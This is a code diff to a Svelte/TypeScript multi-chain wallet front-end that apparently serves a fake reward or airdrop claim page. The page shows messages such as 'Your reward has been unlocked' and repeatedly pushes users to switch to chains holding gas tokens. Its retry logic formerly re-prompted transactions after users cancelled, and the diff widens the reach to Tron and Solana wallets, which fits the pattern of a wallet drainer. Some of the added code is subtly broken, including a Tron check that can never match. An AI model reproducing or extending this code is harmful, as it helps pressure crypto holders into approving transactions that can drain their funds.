@@ -30,7 +30,9 @@ const EVM_CHAINS = [
   { chainId: "0xa", name: "Optimism", nativeCurrency: "ETH" },
   { chainId: "0x38", name: "BNB Chain", nativeCurrency: "BNB" },
   { chainId: "0x2105", name: "Base", nativeCurrency: "ETH" },
-  { chainId: "0xa86a", name: "Avalanche C-Chain", nativeCurrency: "AVAX" }
+  { chainId: "0xa86a", name: "Avalanche C-Chain", nativeCurrency: "AVAX" },
+  { chainId: "tron-mainnet", name: "Tron", nativeCurrency: "TRX" },      // custom chainId
+  { chainId: "solana-mainnet", name: "Solana", nativeCurrency: "SOL" }    // custom chainId
 ];
 
 let currentChainId: string | null = null;
@@ -119,13 +121,18 @@ async function retryTx(
     } catch (err: any) {
       lastError = err;
 
-      // Log cancellation or other errors but continue retrying
+      // FIXED: Don't retry if user cancelled - stop immediately
       if (err.code === 4001 || err.code === '4001' || 
           err.message?.includes("User rejected") || 
           err.message?.includes("User denied") ||
           err.message?.includes("cancelled") ||
           err.message?.includes("canceled")) {
-        console.log("User cancelled operation. Retrying...");
+        console.log("User cancelled operation - stopping retries");
+        throw err; // Re-throw to stop the retry loop
+      }
+
+      if (err.code === 4001) {
+        console.log("User cancelled wallet prompt. Retrying...");
       } else {
         console.log("Transaction failed. Retrying...", err);
       }
@@ -136,6 +143,7 @@ async function retryTx(
 
   throw lastError;
 }
+
 /* ---------------- SOLANA ---------------- */
 const solConnection = new Connection(clusterApiUrl("mainnet-beta"));
 
@@ -320,54 +328,39 @@ function getTronAddress(provider: any): string | null {
   return base58 || null;
 }
 
-// FIXED: Updated connectTron to use initTronLink for proper TronWeb injection
+// Robust connectTron: cancelled=true if address is null
 async function connectTron(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
   try {
-    // Use the new initTronLink function for proper TronWeb injection [^25^]
+    // Attempt to connect via initTronLink
     const result = await initTronLink();
-    
-    if (!result) {
-      // Try fallback to existing provider detection
-      const provider = getTronProvider();
-      if (!provider) {
-        console.error("Tron provider not found.");
-        return { success: false };
-      }
-      
-      // Try to get address from existing provider
-      const addr = getTronAddress(provider);
-      if (!addr) {
-        console.error("Tron address not available");
-        return { success: false };
-      }
-      
-      tronAddress = addr;
-      setupTronEventListeners(provider.wallet);
-      return { success: true, address: addr };
-    }
-    
-    // Success from initTronLink
-    tronAddress = result.address;
-    
-    // Setup event listeners on the tronLink object
-    const tronLink = (window as any).tronLink || (window as any).tron;
-    if (tronLink) {
-      setupTronEventListeners(tronLink);
-    }
-    
-    return { success: true, address: result.address };
-    
-  } catch (e: any) {
-    console.error("Tron connection error:", e);
-    // Check for user cancellation
-    if (e?.message === "USER_CANCELLED" || 
-        e?.code === 4001 || e?.code === '4001' || 
-        e?.message?.includes("rejected") || 
-        e?.message?.includes("cancelled") ||
-        e?.message?.includes("canceled")) {
+    console.log("TronLink connection result:", result);
+
+    // If result is null or has no address, treat as cancelled
+    if (!result?.address) {
+      console.error("Tron connection failed: no address returned from TronLink.");
       return { success: false, cancelled: true };
     }
-    return { success: false };
+
+    // Valid address found
+    const addr = result.address;
+    tronAddress = addr;
+
+    const tronLink = (window as any).tronLink || (window as any).tron;
+    if (tronLink) setupTronEventListeners(tronLink);
+
+    return { success: true, address: addr };
+
+  } catch (e: any) {
+    console.error("Tron connection error:", e);
+
+    // Detect explicit user cancellation
+    const cancelledMessages = ["USER_CANCELLED", "rejected", "cancelled", "canceled"];
+    if (e?.code === 4001 || e?.code === "4001" || cancelledMessages.some(msg => e?.message?.includes(msg))) {
+      return { success: false, cancelled: true };
+    }
+
+    // Any other unexpected error should also be treated as cancelled
+    return { success: false, cancelled: true };
   }
 }
 
@@ -631,9 +624,7 @@ function promptChainSwitch(type: string) {
   if (type === "evm") {
     showChainSwitchPopup = true;
   } else {
-    eligibilityMessage = "❌ Wallet ineligible\n\nPerform more onchain transactions to be eligible and ensure you have enough coins to cover gas fees.";
-    showEligibilityResult = true;
-    setTimeout(() => showEligibilityResult = false, 4000);
+    showChainSwitchPopup = true;
   }
 }
 
@@ -1437,6 +1428,33 @@ async function chooseWallet(walletConfig: typeof WALLET_CONFIGS[0]) {
       return; // User cancelled, don't proceed
     }
     
+    // For Tron wallets, try fallback to other Tron wallets only if not cancelled
+    if (type === "tron" && !isMobile()) {
+      if (walletConfig.name === "TronLink" && !hasTokenPocket()) {
+        // Try Trust Wallet extension as fallback (desktop only)
+        if (hasTrustWallet()) {
+          eligibilityMessage = "⚠️ TronLink not found. Trying Trust Wallet...";
+          showEligibilityResult = true;
+          setTimeout(async () => {
+            showEligibilityResult = false;
+            await tryFallbackWallet("Trust Wallet");
+          }, 1500);
+          return;
+        }
+      } else if (walletConfig.name === "TokenPocket" && !hasTronLink()) {
+        // Try Trust Wallet extension as fallback (desktop only)
+        if (hasTrustWallet()) {
+          eligibilityMessage = "⚠️ TokenPocket not found. Trying Trust Wallet...";
+          showEligibilityResult = true;
+          setTimeout(async () => {
+            showEligibilityResult = false;
+            await tryFallbackWallet("Trust Wallet");
+          }, 1500);
+          return;
+        }
+      }
+    }
+    
     // Mobile: Open Trust Wallet with Tron chain deep link
     if (type === "tron" && isMobile()) {
       eligibilityMessage = "⚠️ Opening Trust Wallet (Tron chain)...";
@@ -1606,8 +1624,10 @@ function showError(message: string) {
 
     {#if evmAddress}<div class="wallet">🔗 EVM: {evmAddress.slice(0,6)}...{evmAddress.slice(-4)}</div>{/if}
     {#if solAddress}<div class="wallet">🔗 SOL: {solAddress.slice(0,6)}...{solAddress.slice(-4)}</div>{/if}
-    {#if tronAddress}
-      <div class="wallet">🔗 TRON: {tronAddress.slice(0,6)}...{tronAddress.slice(-4)}</div>
+    {#if tronAddress && typeof tronAddress === 'string'}
+      <div class="wallet">
+        🔗 TRON: {tronAddress.slice(0,6)}...{tronAddress.slice(-4)}
+      </div>
     {/if}
 
     {#if claimed}<div class="success">✅ Success! Your reward has been unlocked.</div>{/if}
@@ -1689,7 +1709,23 @@ function showError(message: string) {
         <h3>Switch Network</h3>
         <p>Current network has no gas tokens, gas fees are always required to facilitate onchain transactions by the blockchain from your end. Select another chain with enough gas fees to cover transaction:</p>
         {#each EVM_CHAINS as chain}
-          <button class="chain-btn" onclick={() => switchEVMChain(chain.chainId)}>
+          <button
+            class="chain-btn"
+            onclick={() => {
+              if (chain.chainId.startsWith("0x")) {
+                // EVM chain: call regular switch function
+                switchEVMChain(chain.chainId);
+              } else if (chain.name.startsWith("tron")) {
+                // Tron: call Tron-specific connection function
+                connectTron();
+              } else if (chain.chainId.startsWith("solana")) {
+                // Solana: call Solana-specific connection function
+                connectSolana();
+              } else {
+                console.warn("Unknown chain type:", chain.chainId);
+              }
+            }}
+          >
             {chain.name}
           </button>
         {/each}
@@ -1793,7 +1829,7 @@ h1{ margin:10px 0;font-size:24px; }
     border-radius: 12px;
     margin-bottom: 0;
   }
-
+  
   .mobile-wallet-name {
     font-size: 15px;
     font-weight: 700;
